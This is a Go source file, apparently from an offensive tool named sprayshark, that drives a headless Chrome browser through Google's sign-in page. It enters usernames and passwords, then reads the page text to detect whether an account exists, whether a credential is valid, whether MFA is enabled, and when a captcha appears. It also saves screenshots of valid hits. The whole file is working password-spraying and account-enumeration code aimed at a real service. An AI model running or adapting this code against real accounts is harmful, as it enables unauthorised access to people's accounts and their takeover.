package driver

import (
	//"bytes"
	"context"
	"encoding/base64"
	//"errors"
	"fmt"
	//"image"
	"log/slog"
	"os"
	//"os/exec"
	"path/filepath"
	"strings"
	//"sync"
	"time"
	"github.com/PuerkitoBio/goquery"

	//"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	//"github.com/chromedp/cdproto/runtime"
	//"github.com/chromedp/cdproto/storage"
	"github.com/chromedp/chromedp"
	//"github.com/corona10/goimagehash"
	"github.com/helviojunior/sprayshark/internal/islazy"
	"github.com/helviojunior/sprayshark/pkg/models"
	"github.com/helviojunior/sprayshark/pkg/runner"
)

// Chromedp is a driver that probes web targets using chromedp
// Implementation ref: https://github.com/chromedp/examples/blob/master/multi/main.go
type Chromedp struct {
	// options for the Runner to consider
	options runner.Options
	// logger
	log *slog.Logger
}

// browserInstance is an instance used by one run of Witness
type browserInstance struct {
	allocCtx    context.Context
	allocCancel context.CancelFunc
	userData    string
}

// Close closes the allocator, and cleans up the user dir.
func (b *browserInstance) Close() {
	b.allocCancel()
	<-b.allocCtx.Done()

	// cleanup the user data directory
	os.RemoveAll(b.userData)
}

// SliceContainsInt ... returns true/false
func SliceContainsInt(slice []int, num int) bool {
    for _, v := range slice {
        if v == num {
            return true
        }
    }
    return false
}

// getChromedpAllocator is a helper function to get a chrome allocation context.
//
// see Witness for more information on why we're explicitly not using tabs
// (to do that we would alloc in the NewChromedp function and make sure that
// we have the browser started with chromedp.Run(browserCtx)).
func getChromedpAllocator(opts runner.Options) (*browserInstance, error) {
	var (
		allocCtx    context.Context
		allocCancel context.CancelFunc
		userData    string
		err         error
	)

	if opts.Chrome.WSS == "" {
		userData, err = os.MkdirTemp("", "sprayshark-v3-chromedp-*")
		if err != nil {
			return nil, err
		}

		// set up chrome context and launch options
		allocOpts := append(chromedp.DefaultExecAllocatorOptions[:],
			chromedp.IgnoreCertErrors,
			chromedp.UserAgent(opts.Chrome.UserAgent),
			//chromedp.Flag("disable-features", "MediaRouter"),
			chromedp.Flag("mute-audio", true),
			//chromedp.Flag("disable-background-timer-throttling", true),
			//chromedp.Flag("disable-backgrounding-occluded-windows", true),
			//chromedp.Flag("disable-renderer-backgrounding", true),
			chromedp.Flag("deny-permission-prompts", true),
			//chromedp.Flag("explicitly-allowed-ports", restrictedPorts()),
			chromedp.Flag("incognito", true),
			chromedp.Flag("lang", "en-US"),
			//chromedp.Flag("no-sandbox", true),
			chromedp.Flag("disable-dev-shm-usage", true),
			chromedp.Flag("headless", true),
    		chromedp.Flag("enable-automation", false),
    		chromedp.Flag("remote-debugging-port", "9222"),
			chromedp.Flag("allow-running-insecure-content", true),
			chromedp.WindowSize(opts.Chrome.WindowX, opts.Chrome.WindowY),
			chromedp.UserDataDir(userData),
		)

		// Set proxy if specified
		if opts.Chrome.Proxy != "" {
			allocOpts = append(allocOpts, chromedp.ProxyServer(opts.Chrome.Proxy))
		}

		// Use specific Chrome binary if provided
		if opts.Chrome.Path != "" {
			allocOpts = append(allocOpts, chromedp.ExecPath(opts.Chrome.Path))
		}

		allocCtx, allocCancel = chromedp.NewExecAllocator(context.Background(), allocOpts...)

	} else {
		allocCtx, allocCancel = chromedp.NewRemoteAllocator(context.Background(), opts.Chrome.WSS)
	}

	return &browserInstance{
		allocCtx:    allocCtx,
		allocCancel: allocCancel,
		userData:    userData,
	}, nil
}

// NewChromedp returns a new Chromedp instance
func NewChromedp(logger *slog.Logger, opts runner.Options) (*Chromedp, error) {
	return &Chromedp{
		options: opts,
		log:     logger,
	}, nil
}

func DoFinal(run *Chromedp, navigationCtx context.Context, username string, result *models.Result) {
	logger := run.log.With("user", username)

	need_wait := true

	//if !run.options.Logging.LogScanErrors {
	//	return
	//}

	logger.Debug("Result ", "Found", result.ValidCredential, "UserExists", result.UserExists, "Failed", result.Failed, "FailedReason", result.FailedReason)

	// get html
	if run.options.Scan.SaveHTML || result.ValidCredential {
		time.Sleep(5 * time.Second)
		need_wait = false
		if err := chromedp.Run(navigationCtx, chromedp.OuterHTML(":root", &result.HTML, chromedp.ByQueryAll)); err != nil {
			if run.options.Logging.LogScanErrors {
				logger.Error("could not get page html", "err", err)
			}
		}
	}

	if !run.options.Scan.ScreenshotSaveAll && !result.UserExists && !result.ValidCredential {
		return
	}

	//Wait some time before take screenshot
	if need_wait {
		time.Sleep(5 * time.Second)
	}

	// grab a screenshot
	var img []byte
	err := chromedp.Run(navigationCtx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			var err error
			params := page.CaptureScreenshot().
				WithQuality(80).
				WithFormat(page.CaptureScreenshotFormat(run.options.Scan.ScreenshotFormat))

			// if fullpage
			if run.options.Scan.ScreenshotFullPage {
				params = params.WithCaptureBeyondViewport(true)
			}

			img, err = params.Do(ctx)
			return err
		}),
	)

	if err != nil {
		if run.options.Logging.LogScanErrors {
			logger.Error("could not grab screenshot", "err", err)
		}

		result.Failed = true
		result.FailedReason = err.Error()
	} else {

		// give the writer a screenshot to deal with
		if run.options.Scan.ScreenshotToWriter {
			result.Screenshot = base64.StdEncoding.EncodeToString(img)
		}

		if result.ValidCredential {
			result.Filename = "valid_" + islazy.SafeFileName(username) + "_" + result.PasswordHash + "." + run.options.Scan.ScreenshotFormat
			result.Filename = islazy.LeftTrucate(result.Filename, 200)
			if err := os.WriteFile(
				filepath.Join(run.options.Scan.ScreenshotPath, result.Filename),
				img, os.FileMode(0664),
			); err != nil {
				return			}
		}

		// write the screenshot to disk if we have a path
		if !run.options.Scan.ScreenshotSkipSave {
			result.Filename = islazy.SafeFileName(username) + "_" + result.PasswordHash + "." + run.options.Scan.ScreenshotFormat
			result.Filename = islazy.LeftTrucate(result.Filename, 200)
			if err := os.WriteFile(
				filepath.Join(run.options.Scan.ScreenshotPath, result.Filename),
				img, os.FileMode(0664),
			); err != nil {
				return			}
		}

	}

}

// witness does the work of probing a url.
// This is where everything comes together as far as the runner is concerned.
func (run *Chromedp) Check(username string, password string, thisRunner *runner.Runner, to int, enumOnly bool) (*models.Result, error) {
	logger := run.log.With("user", username)

	// this might be weird to see, but when screenshotting a large list, using
	// tabs means the chances of the screenshot failing is madly high. could be
	// a resources thing I guess with a parent browser process? so, using this
	// driver now means the resource usage will be higher, but, your accuracy
	// will also be amazing.
	allocator, err := getChromedpAllocator(run.options)
	if err != nil {
		return nil, err
	}
	defer allocator.Close()
	browserCtx, cancel := chromedp.NewContext(allocator.allocCtx)
	defer cancel()

	// get a tab
	tabCtx, tabCancel := chromedp.NewContext(browserCtx)
	defer tabCancel()

	// get a timeout context for navigation
	logger.Debug("Running with timeout...", "timeout", run.options.Scan.Timeout + to)
	navigationCtx, navigationCancel := context.WithTimeout(tabCtx, time.Duration(run.options.Scan.Timeout + to)*time.Second)
	defer navigationCancel()

	// set extra headers, if any
	if len(run.options.Chrome.Headers) > 0 {
		headers := make(network.Headers)
		for _, header := range run.options.Chrome.Headers {
			kv := strings.SplitN(header, ":", 2)
			if len(kv) != 2 {
				logger.Warn("custom header did not parse correctly", "header", header)
				continue
			}

			headers[strings.TrimSpace(kv[0])] = strings.TrimSpace(kv[1])
		}

		if err := chromedp.Run(navigationCtx, network.SetExtraHTTPHeaders((headers))); err != nil {
			return nil, fmt.Errorf("could not set extra http headers: %w", err)
		}
	}

	// use page events to grab information about targets. It's how we
	// know what the results of the first request is to save as an overall
	// url result for output writers.
	var (
		result = &models.Result{
			User: username,
			Password: password,
			ProbedAt: time.Now(),
		}
		//resultMutex sync.Mutex
		//first       *network.EventRequestWillBeSent
		//netlog      = make(map[string]models.NetworkLog)
	)

	// Calculate password hash
	result.CalcHash()

	// navigate to the target
	if err := chromedp.Run(
		navigationCtx, chromedp.Navigate("https://accounts.google.com/"),
	); err != nil && err != context.DeadlineExceeded {
		return nil, fmt.Errorf("could not navigate to target: %w", err)
	}

	// just wait if there is a delay
	if run.options.Scan.Delay > 0 {
		time.Sleep(time.Duration(run.options.Scan.Delay) * time.Second)
	}

	//Fill username
	err = chromedp.Run(navigationCtx, chromedp.Tasks {
			chromedp.WaitVisible(`//*[@id='identifierId']`),
			chromedp.SendKeys(`//*[@id='identifierId']`, username),
			chromedp.Click(`//*[text()='Próxima' or text()='Next']/ancestor::button[*]`, chromedp.NodeVisible),
		},
	)

	if err != nil {
		result.Failed = true
		result.FailedReason = err.Error()
		DoFinal(run, navigationCtx, username, result)
		return result, nil
	}

	// Wait until following conditions:
	//  - Show a error: 
	// 		not be secure 
	//		find your Google Account
	// 		Captcha
	good_to_go := false
	counter := 0
	passwd_selector := ""
	for good_to_go != true {
		counter += 1
		logger.Debug("Loop find password field", "Counter", counter)

		var html string
		if err := chromedp.Run(navigationCtx, chromedp.OuterHTML(":root", &html, chromedp.ByQueryAll)); err != nil {
			result.Failed = true
			result.FailedReason = err.Error()
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		if strings.Contains(html, "This browser or app may not be secure") == true {
			result.Failed = true
			result.FailedReason = "Browser not secure"
			logger.Debug("Returning", "reason", result.FailedReason)
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		if strings.Contains(html, "find your Google Account") == true {
			result.UserExists = false
			logger.Debug("Returning", "reason", "Could not find your Google Account")
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		if strings.Contains(html, "Enter a valid email") == true {
			result.UserExists = false
			logger.Debug("Returning", "reason", "Invalid email")
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		// This service isn't available in your country
		if strings.Contains(html, "available in your country") == true {
			result.UserExists = false
			result.Failed = true
			result.FailedReason = "Region block"
			logger.Debug("Returning", "reason", result.FailedReason)
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		if strings.Contains(html, "Which account do you want to use") == true {
			result.UserExists = true
			//DoFinal(run, navigationCtx, username, result)
			//return result, nil

			logger.Debug("Multiple account found!")

			if !enumOnly {
				err = chromedp.Run(navigationCtx, chromedp.Tasks {
						chromedp.Click(`//*[contains(text(), "account owned by")]`, chromedp.BySearch),
					},
				)
				if err != nil {
					logger.Debug("Error selecting corporate account", "err", err)
					result.Failed = true
					result.FailedReason = err.Error()
					DoFinal(run, navigationCtx, username, result)
					return result, nil
				}
				time.Sleep(time.Duration(5) * time.Second)
				if err := chromedp.Run(navigationCtx, chromedp.OuterHTML(":root", &html, chromedp.ByQueryAll)); err != nil {
					result.Failed = true
					result.FailedReason = err.Error()
					DoFinal(run, navigationCtx, username, result)
					return result, nil
				}
			}
		}

		//if strings.Contains(html, "Type the text you hear or see") == true {
		//	result.Failed = true
		//	result.FailedReason = "Captcha found"
		//	DoFinal(run, navigationCtx, username, result)
		//	return result, nil
		//}

		html_reader := strings.NewReader(html)
		doc, err := goquery.NewDocumentFromReader(html_reader)
		if err != nil {
		    result.Failed = true
			result.FailedReason = err.Error()
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}

		doc.Find(`audio[id="captchaAudio"]`).Each(func(i int, s *goquery.Selection) {
			t1, ex := s.Attr("src")
			if ex == true && t1 != "" {
				result.UserExists = true
				result.Failed = true && !enumOnly
				result.FailedReason = "Captcha found"
				good_to_go = true
			}
		})

		doc.Find(`input[type="password"]`).Each(func(i int, s *goquery.Selection) {
			pts := 0
			if len(s.Nodes) > 0 {
				passwd_selector = ""
				n := s.Get(0) // Retrieves the internal *html.Node
				for _, a := range n.Attr {
					switch strings.ToLower(a.Key) {
						case "name":
							if a.Val == "hiddenPassword" {
								pts += 1
							}else{
								passwd_selector = `input[type="password"][name="`+ a.Val +`"]`
							}
						case "tabindex":
							if a.Val == "-1" {
								pts += 1
							}
						case "aria-hidden":
							if a.Val == "true" {
								pts += 1
							}
						case "id":
							passwd_selector = `input[type="password"][id="`+ a.Val +`"]`
					}
				}
			}
			if pts == 0 {
				good_to_go = true
			}
		})

		if good_to_go == false {
			doc.Find("iframe").Each(func(i int, s *goquery.Selection) {
				// For each item found, get the title
				t1, ex := s.Attr("title")
				if ex && strings.Contains(strings.ToLower(t1), "recaptcha") == true {
					result.UserExists = true
					result.Failed = true && !enumOnly
					result.FailedReason = "Captcha found"
				}
			})
		}

		if result.Failed == true || (enumOnly && strings.Contains(result.FailedReason, "Captcha")){
			logger.Debug("Returning", "reason", result.FailedReason)
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}

		if counter >= 10 {
			result.Failed = true
			result.FailedReason = "Cannot find password field"
			logger.Debug("Returning", "reason", result.FailedReason)
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}

		time.Sleep(1 * time.Second)
	}

	logger.Debug("End of Loop find password field", "passwd_selector", passwd_selector)

	//fill password
	if passwd_selector == "" {
		result.Failed = true
		result.FailedReason = "Cannot find password field"
		logger.Debug("Returning", "reason", result.FailedReason)
		DoFinal(run, navigationCtx, username, result)
		return result, nil
	}

	// Not try to verify password
	if enumOnly {
		//If this point of code have been reched I can understand that user exists
		result.UserExists = true
		DoFinal(run, navigationCtx, username, result)
		return result, nil
	}

	err = chromedp.Run(navigationCtx, chromedp.Tasks {
			chromedp.WaitVisible(passwd_selector),
			chromedp.SendKeys(passwd_selector, password),
			chromedp.Click(`//*[text()='Próxima' or text()='Next']/ancestor::button[*]`, chromedp.NodeVisible),
		},
	)
	if err != nil {
		result.Failed = true
		result.FailedReason = err.Error()
		logger.Debug("Returning", "reason", result.FailedReason)
		DoFinal(run, navigationCtx, username, result)
		return result, nil
	}

	good_to_go = false
	counter = 0
	for good_to_go != true {

		counter += 1
		logger.Debug("Loop post pwd submit", "Counter", counter)

		time.Sleep(1 * time.Second)

		var post_html string
		if err := chromedp.Run(navigationCtx, chromedp.OuterHTML(":root", &post_html, chromedp.ByQueryAll)); err != nil {
			result.Failed = true
			result.FailedReason = err.Error()
			logger.Debug("Returning", "reason", result.FailedReason)
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		if strings.Contains(post_html, "really you trying to sign") == true {
			result.UserExists = true
			result.ValidCredential = true
			logger.Debug("Returning", "reason", result.FailedReason)
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		if strings.Contains(post_html, "Google sent a notification to your") == true {
			result.UserExists = true
			result.ValidCredential = true
			result.HasMFA = true
			logger.Debug("Returning", "reason", "credential found")
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		if strings.Contains(post_html, "Get a verification code") == true {
			result.UserExists = true
			result.ValidCredential = true
			result.HasMFA = true
			logger.Debug("Returning", "reason", "credential found")
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		if strings.Contains(post_html, "Choose how you want to sign in") == true {
			result.UserExists = true
			result.ValidCredential = true
			result.HasMFA = true
			logger.Debug("Returning", "reason", "credential found")
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		if strings.Contains(post_html, "Wrong password") == true {
			logger.Debug("Wrong password text found")
			result.UserExists = true
			result.ValidCredential = false
			logger.Debug("Returning", "reason", result.FailedReason)
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		// This service isn't available in your country
		if strings.Contains(post_html, "available in your country") == true {
			result.UserExists = true
			result.ValidCredential = true
			logger.Debug("Returning", "reason", "credential found")
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}
		post_html_reader := strings.NewReader(post_html)
		doc, err := goquery.NewDocumentFromReader(post_html_reader)
		if err != nil {
		    result.Failed = true
			result.FailedReason = err.Error()
			logger.Debug("Returning", "reason", result.FailedReason)
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}

		doc.Find(`audio[id="captchaAudio"]`).Each(func(i int, s *goquery.Selection) {
			t1, ex := s.Attr("src")
			if ex == true && t1 != "" {
				result.Failed = true
				result.FailedReason = "Captcha found"
			}
		})

		doc.Find(`input[type="password"]`).Each(func(i int, s *goquery.Selection) {
			pts := 0
			if len(s.Nodes) > 0 {
				passwd_selector = ""
				n := s.Get(0) // Retrieves the internal *html.Node
				for _, a := range n.Attr {
					switch strings.ToLower(a.Key) {
						case "name":
							if a.Val == "hiddenPassword" {
								pts += 1
							}
						case "tabindex":
							if a.Val == "-1" {
								pts += 1
							}
						case "aria-hidden":
							if a.Val == "true" {
								pts += 1
							}
						case "data-initial-value":
							if a.Val == password {
								pts += 1
							}
					}
				}
			}
			if pts == 0 {
				good_to_go = true
				logger.Debug("Input type password found")
			}
		})

		if good_to_go == false {
			doc.Find("iframe").Each(func(i int, s *goquery.Selection) {
				// For each item found, get the title
				t1, ex := s.Attr("title")
				if ex && strings.Contains(strings.ToLower(t1), "recaptcha") == true {
					result.Failed = true
					result.FailedReason = "Captcha found"
				}
			})
		}

		if result.Failed == true {
			logger.Debug("Returning", "reason", result.FailedReason)
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}

		if good_to_go == true {
			result.UserExists = true
			result.ValidCredential = false
			logger.Debug("Returning", "reason", result.FailedReason)
			DoFinal(run, navigationCtx, username, result)
			return result, nil
		}

		if counter >= 5 {
			//Exit loop
			good_to_go = true
		}

	}

	logger.Debug("End of Loop password submit")

	result.UserExists = true
	result.ValidCredential = true
	DoFinal(run, navigationCtx, username, result)

	return result, nil
}

func (run *Chromedp) Close() {
	run.log.Debug("closing browser allocation context")
}
